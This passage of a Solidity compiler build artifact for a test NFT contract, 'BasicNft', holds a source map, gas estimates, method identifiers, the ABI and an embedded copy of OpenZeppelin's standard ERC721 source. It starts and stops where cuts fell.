19;;9444:366;;;:::o;9816:::-;9958:3;9979:67;10043:2;10038:3;9979:67;:::i;:::-;9972:74;;10055:93;10144:3;10055:93;:::i;:::-;10173:2;10168:3;10164:12;10157:19;;9816:366;;;:::o;10188:::-;10330:3;10351:67;10415:2;10410:3;10351:67;:::i;:::-;10344:74;;10427:93;10516:3;10427:93;:::i;:::-;10545:2;10540:3;10536:12;10529:19;;10188:366;;;:::o;10560:::-;10702:3;10723:67;10787:2;10782:3;10723:67;:::i;:::-;10716:74;;10799:93;10888:3;10799:93;:::i;:::-;10917:2;10912:3;10908:12;10901:19;;10560:366;;;:::o;10932:::-;11074:3;11095:67;11159:2;11154:3;11095:67;:::i;:::-;11088:74;;11171:93;11260:3;11171:93;:::i;:::-;11289:2;11284:3;11280:12;11273:19;;10932:366;;;:::o;11304:118::-;11391:24;11409:5;11391:24;:::i;:::-;11386:3;11379:37;11304:118;;:::o;11428:222::-;11521:4;11559:2;11548:9;11544:18;11536:26;;11572:71;11640:1;11629:9;11625:17;11616:6;11572:71;:::i;:::-;11428:222;;;;:::o;11656:640::-;11851:4;11889:3;11878:9;11874:19;11866:27;;11903:71;11971:1;11960:9;11956:17;11947:6;11903:71;:::i;:::-;11984:72;12052:2;12041:9;12037:18;12028:6;11984:72;:::i;:::-;12066;12134:2;12123:9;12119:18;12110:6;12066:72;:::i;:::-;12185:9;12179:4;12175:20;12170:2;12159:9;12155:18;12148:48;12213:76;12284:4;12275:6;12213:76;:::i;:::-;12205:84;;11656:640;;;;;;;:::o;12302:210::-;12389:4;12427:2;12416:9;12412:18;12404:26;;12440:65;12502:1;12491:9;12487:17;12478:6;12440:65;:::i;:::-;12302:210;;;;:::o;12518:313::-;12631:4;12669:2;12658:9;12654:18;12646:26;;12718:9;12712:4;12708:20;12704:1;12693:9;12689:17;12682:47;12746:78;12819:4;12810:6;12746:78;:::i;:::-;12738:86;;12518:313;;;;:::o;12837:419::-;13003:4;13041:2;13030:9;13026:18;13018:26;;13090:9;13084:4;13080:20;13076:1;13065:9;13061:17;13054:47;13118:131;13244:4;13118:131;:::i;:::-;13110:139;;12837:419;;;:::o;13262:::-;13428:4;13466:2;13455:9;13451:18;13443:26;;13515:9;13509:4;13505:20;13501:1;13490:9;13486:17;13479:47;13543:131;13669:4;13543:131;:::i;:::-;13535:139;;13262:419;;;:::o;13687:::-;13853:4;13891:2;13880:9;13876:18;13868:26;;13940:9;13934:4;13930:20;13926:1;13915:9;13911:17;13904:47;13968:131;14094:4;13968:131;:::i;:::-;13960:139;;13687:419;;;:::o;14112:::-;14278:4;14316:2;14305:9;14301:18;14293:26;;14365:9;14359:4;14355:20;14351:1;14340:9;14336:17;14329:47;14393:131;14519:4;14393:131;:::i;:::-;14385:139;;14112:419;;;:::o;14537:::-;14703:4;14741:2;14730:9;14726:18;14718:26;;14790:9;14784:4;14780:20;14776:1;14765:9;14761:17;14754:47;14818:131;14944:4;14818:131;:::i;:::-;14810:139;;14537:419;;;:::o;14962:::-;15128:4;15166:2;15155:9;15151:18;15143:26;;15215:9;15209:4;15205:20;15201:1;15190:9;15186:17;15179:47;15243:131;15369:4;15243:131;:::i;:::-;15235:139;;14962:419;;;:::o;15387:::-;15553:4;15591:2;15580:9;15576:18;15568:26;;15640:9;15634:4;15630:20;15626:1;15615:9;15611:17;15604:47;15668:131;15794:4;15668:131;:::i;:::-;15660:139;;15387:419;;;:::o;15812:::-;15978:4;16016:2;16005:9;16001:18;15993:26;;16065:9;16059:4;16055:20;16051:1;16040:9;16036:17;16029:47;16093:131;16219:4;16093:131;:::i;:::-;16085:139;;15812:419;;;:::o;16237:::-;16403:4;16441:2;16430:9;16426:18;16418:26;;16490:9;16484:4;16480:20;16476:1;16465:9;16461:17;16454:47;16518:131;16644:4;16518:131;:::i;:::-;16510:139;;16237:419;;;:::o;16662:::-;16828:4;16866:2;16855:9;16851:18;16843:26;;16915:9;16909:4;16905:20;16901:1;16890:9;16886:17;16879:47;16943:131;17069:4;16943:131;:::i;:::-;16935:139;;16662:419;;;:::o;17087:::-;17253:4;17291:2;17280:9;17276:18;17268:26;;17340:9;17334:4;17330:20;17326:1;17315:9;17311:17;17304:47;17368:131;17494:4;17368:131;:::i;:::-;17360:139;;17087:419;;;:::o;17512:::-;17678:4;17716:2;17705:9;17701:18;17693:26;;17765:9;17759:4;17755:20;17751:1;17740:9;17736:17;17729:47;17793:131;17919:4;17793:131;:::i;:::-;17785:139;;17512:419;;;:::o;17937:222::-;18030:4;18068:2;18057:9;18053:18;18045:26;;18081:71;18149:1;18138:9;18134:17;18125:6;18081:71;:::i;:::-;17937:222;;;;:::o;18165:129::-;18199:6;18226:20;;:::i;:::-;18216:30;;18255:33;18283:4;18275:6;18255:33;:::i;:::-;18165:129;;;:::o;18300:75::-;18333:6;18366:2;18360:9;18350:19;;18300:75;:::o;18381:307::-;18442:4;18532:18;18524:6;18521:30;18518:56;;;18554:18;;:::i;:::-;18518:56;18592:29;18614:6;18592:29;:::i;:::-;18584:37;;18676:4;18670;18666:15;18658:23;;18381:307;;;:::o;18694:98::-;18745:6;18779:5;18773:12;18763:22;;18694:98;;;:::o;18798:99::-;18850:6;18884:5;18878:12;18868:22;;18798:99;;;:::o;18903:168::-;18986:11;19020:6;19015:3;19008:19;19060:4;19055:3;19051:14;19036:29;;18903:168;;;;:::o;19077:169::-;19161:11;19195:6;19190:3;19183:19;19235:4;19230:3;19226:14;19211:29;;19077:169;;;;:::o;19252:305::-;19292:3;19311:20;19329:1;19311:20;:::i;:::-;19306:25;;19345:20;19363:1;19345:20;:::i;:::-;19340:25;;19499:1;19431:66;19427:74;19424:1;19421:81;19418:107;;;19505:18;;:::i;:::-;19418:107;19549:1;19546;19542:9;19535:16;;19252:305;;;;:::o;19563:191::-;19603:4;19623:20;19641:1;19623:20;:::i;:::-;19618:25;;19657:20;19675:1;19657:20;:::i;:::-;19652:25;;19696:1;19693;19690:8;19687:34;;;19701:18;;:::i;:::-;19687:34;19746:1;19743;19739:9;19731:17;;19563:191;;;;:::o;19760:96::-;19797:7;19826:24;19844:5;19826:24;:::i;:::-;19815:35;;19760:96;;;:::o;19862:90::-;19896:7;19939:5;19932:13;19925:21;19914:32;;19862:90;;;:::o;19958:149::-;19994:7;20034:66;20027:5;20023:78;20012:89;;19958:149;;;:::o;20113:126::-;20150:7;20190:42;20183:5;20179:54;20168:65;;20113:126;;;:::o;20245:77::-;20282:7;20311:5;20300:16;;20245:77;;;:::o;20328:154::-;20412:6;20407:3;20402;20389:30;20474:1;20465:6;20460:3;20456:16;20449:27;20328:154;;;:::o;20488:307::-;20556:1;20566:113;20580:6;20577:1;20574:13;20566:113;;;20665:1;20660:3;20656:11;20650:18;20646:1;20641:3;20637:11;20630:39;20602:2;20599:1;20595:10;20590:15;;20566:113;;;20697:6;20694:1;20691:13;20688:101;;;20777:1;20768:6;20763:3;20759:16;20752:27;20688:101;20537:258;20488:307;;;:::o;20801:320::-;20845:6;20882:1;20876:4;20872:12;20862:22;;20929:1;20923:4;20919:12;20950:18;20940:81;;21006:4;20998:6;20994:17;20984:27;;20940:81;21068:2;21060:6;21057:14;21037:18;21034:38;21031:84;;;21087:18;;:::i;:::-;21031:84;20852:269;20801:320;;;:::o;21127:281::-;21210:27;21232:4;21210:27;:::i;:::-;21202:6;21198:40;21340:6;21328:10;21325:22;21304:18;21292:10;21289:34;21286:62;21283:88;;;21351:18;;:::i;:::-;21283:88;21391:10;21387:2;21380:22;21170:238;21127:281;;:::o;21414:180::-;21462:77;21459:1;21452:88;21559:4;21556:1;21549:15;21583:4;21580:1;21573:15;21600:180;21648:77;21645:1;21638:88;21745:4;21742:1;21735:15;21769:4;21766:1;21759:15;21786:180;21834:77;21831:1;21824:88;21931:4;21928:1;21921:15;21955:4;21952:1;21945:15;21972:117;22081:1;22078;22071:12;22095:117;22204:1;22201;22194:12;22218:117;22327:1;22324;22317:12;22341:117;22450:1;22447;22440:12;22464:102;22505:6;22556:2;22552:7;22547:2;22540:5;22536:14;22532:28;22522:38;;22464:102;;;:::o;22572:232::-;22712:34;22708:1;22700:6;22696:14;22689:58;22781:15;22776:2;22768:6;22764:15;22757:40;22572:232;:::o;22810:237::-;22950:34;22946:1;22938:6;22934:14;22927:58;23019:20;23014:2;23006:6;23002:15;22995:45;22810:237;:::o;23053:224::-;23193:34;23189:1;23181:6;23177:14;23170:58;23262:7;23257:2;23249:6;23245:15;23238:32;23053:224;:::o;23283:178::-;23423:30;23419:1;23411:6;23407:14;23400:54;23283:178;:::o;23467:223::-;23607:34;23603:1;23595:6;23591:14;23584:58;23676:6;23671:2;23663:6;23659:15;23652:31;23467:223;:::o;23696:175::-;23836:27;23832:1;23824:6;23820:14;23813:51;23696:175;:::o;23877:228::-;24017:34;24013:1;24005:6;24001:14;23994:58;24086:11;24081:2;24073:6;24069:15;24062:36;23877:228;:::o;24111:182::-;24251:34;24247:1;24239:6;24235:14;24228:58;24111:182;:::o;24299:174::-;24439:26;24435:1;24427:6;24423:14;24416:50;24299:174;:::o;24479:220::-;24619:34;24615:1;24607:6;24603:14;24596:58;24688:3;24683:2;24675:6;24671:15;24664:28;24479:220;:::o;24705:248::-;24845:34;24841:1;24833:6;24829:14;24822:58;24914:31;24909:2;24901:6;24897:15;24890:56;24705:248;:::o;24959:235::-;25099:34;25095:1;25087:6;25083:14;25076:58;25168:18;25163:2;25155:6;25151:15;25144:43;24959:235;:::o;25200:122::-;25273:24;25291:5;25273:24;:::i;:::-;25266:5;25263:35;25253:63;;25312:1;25309;25302:12;25253:63;25200:122;:::o;25328:116::-;25398:21;25413:5;25398:21;:::i;:::-;25391:5;25388:32;25378:60;;25434:1;25431;25424:12;25378:60;25328:116;:::o;25450:120::-;25522:23;25539:5;25522:23;:::i;:::-;25515:5;25512:34;25502:62;;25560:1;25557;25550:12;25502:62;25450:120;:::o;25576:122::-;25649:24;25667:5;25649:24;:::i;:::-;25642:5;25639:35;25629:63;;25688:1;25685;25678:12;25629:63;25576:122;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"1925200","executionCost":"infinite","totalCost":"infinite"},"external":{"TOKEN_URI()":"infinite","approve(address,uint256)":"infinite","balanceOf(address)":"2902","getApproved(uint256)":"5300","getTokenCounter()":"2526","isApprovedForAll(address,address)":"infinite","mintNft()":"infinite","name()":"infinite","ownerOf(uint256)":"3069","safeTransferFrom(address,address,uint256)":"infinite","safeTransferFrom(address,address,uint256,bytes)":"infinite","setApprovalForAll(address,bool)":"infinite","supportsInterface(bytes4)":"797","symbol()":"infinite","tokenURI(uint256)":"infinite","transferFrom(address,address,uint256)":"infinite"}},"methodIdentifiers":{"TOKEN_URI()":"78ce9035","approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","getApproved(uint256)":"081812fc","getTokenCounter()":"6e02007d","isApprovedForAll(address,address)":"e985e9c5","mintNft()":"c2229fea","name()":"06fdde03","ownerOf(uint256)":"6352211e","safeTransferFrom(address,address,uint256)":"42842e0e","safeTransferFrom(address,address,uint256,bytes)":"b88d4fde","setApprovalForAll(address,bool)":"a22cb465","supportsInterface(bytes4)":"01ffc9a7","symbol()":"95d89b41","tokenURI(uint256)":"c87b56dd","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"DogMinted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TOKEN_URI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTokenCounter\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mintNft\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"approve(address,uint256)\":{\"details\":\"See {IERC721-approve}.\"},\"balanceOf(address)\":{\"details\":\"See {IERC721-balanceOf}.\"},\"getApproved(uint256)\":{\"details\":\"See {IERC721-getApproved}.\"},\"isApprovedForAll(address,address)\":{\"details\":\"See {IERC721-isApprovedForAll}.\"},\"name()\":{\"details\":\"See {IERC721Metadata-name}.\"},\"ownerOf(uint256)\":{\"details\":\"See {IERC721-ownerOf}.\"},\"safeTransferFrom(address,address,uint256)\":{\"details\":\"See {IERC721-safeTransferFrom}.\"},\"safeTransferFrom(address,address,uint256,bytes)\":{\"details\":\"See {IERC721-safeTransferFrom}.\"},\"setApprovalForAll(address,bool)\":{\"details\":\"See {IERC721-setApprovalForAll}.\"},\"supportsInterface(bytes4)\":{\"details\":\"See {IERC165-supportsInterface}.\"},\"symbol()\":{\"details\":\"See {IERC721Metadata-symbol}.\"},\"tokenURI(uint256)\":{\"details\":\"See {IERC721Metadata-tokenURI}.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC721-transferFrom}.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/test/BasicNft.sol\":\"BasicNft\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC721/ERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/ERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC721.sol\\\";\\nimport \\\"./IERC721Receiver.sol\\\";\\nimport \\\"./extensions/IERC721Metadata.sol\\\";\\nimport \\\"../../utils/Address.sol\\\";\\nimport \\\"../../utils/Context.sol\\\";\\nimport \\\"../../utils/Strings.sol\\\";\\nimport \\\"../../utils/introspection/ERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\\n * {ERC721Enumerable}.\\n */\\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\\n    using Address for address;\\n    using Strings for uint256;\\n\\n    // Token name\\n    string private _name;\\n\\n    // Token symbol\\n    string private _symbol;\\n\\n    // Mapping from token ID to owner address\\n    mapping(uint256 => address) private _owners;\\n\\n    // Mapping owner address to token count\\n    mapping(address => uint256) private _balances;\\n\\n    // Mapping from token ID to approved address\\n    mapping(uint256 => address) private _tokenApprovals;\\n\\n    // Mapping from owner to operator approvals\\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\\n\\n    /**\\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\\n        return\\n            interfaceId == type(IERC721).interfaceId ||\\n            interfaceId == type(IERC721Metadata).interfaceId ||\\n            super.supportsInterface(interfaceId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-balanceOf}.\\n     */\\n    function balanceOf(address owner) public view virtual override returns (uint256) {\\n        require(owner != address(0), \\\"ERC721: address zero is not a valid owner\\\");\\n        return _balances[owner];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-ownerOf}.\\n     */\\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) {\\n        address owner = _ownerOf(tokenId);\\n        require(owner != address(0), \\\"ERC721: invalid token ID\\\");\\n        return owner;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-name}.\\n     */\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-symbol}.\\n     */\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-tokenURI}.\\n     */\\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\\n        _requireMinted(tokenId);\\n\\n        string memory baseURI = _baseURI();\\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \\\"\\\";\\n    }\\n\\n    /**\\n     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\\n     * by default, can be overridden in child contracts.\\n     */\\n    function _baseURI() internal view virtual returns (string memory) {\\n        return \\\"\\\";\\n    }\\n\\n    /**\\n     * @dev See {IERC721-approve}.\\n     */\\n    function approve(address to, uint256 tokenId) public virtual override {\\n        address owner = ERC721.ownerOf(tokenId);\\n        require(to != owner, \\\"ERC721: approval to current owner\\\");\\n\\n        require(\\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\\n            \\\"ERC721: approve caller is not token owner or approved for all\\\"\\n        );\\n\\n        _approve(to, tokenId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-getApproved}.\\n     */\\n    function getApproved(uint256 tokenId) public view virtual override returns (address) {\\n        _requireMinted(tokenId);\\n\\n        return _tokenApprovals[tokenId];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-setApprovalForAll}.\\n     */\\n    function setApprovalForAll(address operator, bool approved) public virtual override {\\n        _setApprovalForAll(_msgSender(), operator, approved);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-isApprovedForAll}.\\n     */\\n    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\\n        return _operatorApprovals[owner][operator];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-transferFrom}.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) public virtual override {\\n        //solhint-disable-next-line max-line-length\\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \\\"ERC721: caller is not token owner or approved\\\");\\n\\n        _transfer(from, to, tokenId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-safeTransferFrom}.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) public virtual override {\\n        safeTransferFrom(from, to, tokenId, \\\"\\\");\\n    }\\n\\n    /**\\n     * @dev See {IERC721-safeTransferFrom}.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) public virtual override {\\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \\\"ERC721: caller is not token owner or approved\\\");\\n        _safeTransfer(from, to, tokenId, data);\\n    }\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\\n     *\\n     * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.\\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _safeTransfer(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) internal virtual {\\n        _transfer(from, to, tokenId);\\n        require(_checkOnERC721Received(from, to, tokenId, data), \\\"ERC721: transfer to non ERC721Receiver implementer\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\\n     */\\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\\n        return _owners[tokenId];\\n    }\\n\\n    /**\\n     * @dev Returns whether `tokenId` exists.\\n     *\\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\\n     *\\n     * Tokens start existing when they are minted (`_mint`),\\n     * and stop existing when they are burned (`_burn`).\\n     */\\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\\n        return _ownerOf(tokenId) != address(0);\\n    }\\n\\n    /**\\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\\n        address owner = ERC721.ownerOf(tokenId);\\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\\n    }\\n\\n    /**\\n     * @dev Safely mints `tokenId` and transfers it to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must not exist.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _safeMint(address to, uint256 tokenId) internal virtual {\\n        _safeMint(to, tokenId, \\\"\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\\n     */\\n    function _safeMint(\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) internal virtual {\\n        _mint(to, tokenId);\\n        require(\\n            _checkOnERC721Received(address(0), to, tokenId, data),\\n            \\\"ERC721: transfer to non ERC721Receiver implementer\\\"\\n        );\\n    }\\n\\n    /**\\n     * @dev Mints `tokenId` and transfers it to `to`.\\n     *\\n     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must not exist.\\n     * - `to` cannot be the zero address.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _mint(address to, uint256 tokenId) internal virtual {\\n        require(to != address(0), \\\"ERC721: mint to the zero address\\\");\\n        require(!_exists(tokenId), \\\"ERC721: token already minted\\\");\\n\\n        _beforeTokenTransfer(address(0), to, tokenId, 1);\\n\\n        // Check that tokenId was not minted by `_beforeTokenTransfer` hook\\n        require(!_exists(tokenId), \\\"ERC721: token already minted\\\");\\n\\n        unchecked {\\n            // Will not overflow unless all 2**256 token ids are minted to the same owner.\\n            // Given that tokens are minted one by one, it is impossible in practice that\\n            // this ever happens. Might change if we allow batch minting.\\n            // The ERC fails to describe this case.\\n            _balances[to] += 1;\\n        }\\n\\n        _owners[tokenId] = to;\\n\\n        emit Transfer(address(0), to, tokenId);\\n\\n        _afterTokenTransfer(address(0), to, tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Destroys `tokenId`.\\n     * The approval is cleared when the token is burned.\\n     * This is an internal function that does not check if the sender is authorized to operate on the token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _burn(uint256 tokenId) internal virtual {\\n        address owner = ERC721.ownerOf(tokenId);\\n\\n        _beforeTokenTransfer(owner, address(0), tokenId, 1);\\n\\n        // Update ownership in case tokenId was transferred by `_beforeTokenTransfer` hook\\n        owner = ERC721.ownerOf(tokenId);\\n\\n        // Clear approvals\\n        delete _tokenApprovals[tokenId];\\n\\n        unchecked {\\n            // Cannot overflow, as that would require more tokens to be burned/transferred\\n            // out than the owner initially received through minting and transferring in.\\n            _balances[owner] -= 1;\\n        }\\n        delete _owners[tokenId];\\n\\n        emit Transfer(owner, address(0), tokenId);\\n\\n        _afterTokenTransfer(owner, address(0), tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Transfers `tokenId` from `from` to `to`.\\n     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) internal virtual {\\n        require(ERC721.ownerOf(tokenId) == from, \\\"ERC721: transfer from incorrect owner\\\");\\n        require(to != address(0), \\\"ERC721: transfer to the zero address\\\");\\n\\n        _beforeTokenTransfer(from, to, tokenId, 1);\\n\\n        // Check that tokenId was not transferred by `_beforeTokenTransfer` hook\\n        require(ERC721.ownerOf(tokenId) == from, \\\"ERC721: transfer from incorrect owner\\\");\\n\\n        // Clear approvals from the previous owner\\n        delete _tokenApprovals[tokenId];\\n\\n        unchecked {\\n            // `_balances[from]` cannot overflow for the same reason as described in `_burn`:\\n            // `from`'s balance is the number of token held, which is at least one before the current\\n            // transfer.\\n            // `_balances[to]` could overflow in the conditions described in `_mint`. That would require\\n            // all 2**256 token ids to be minted, which in practice is 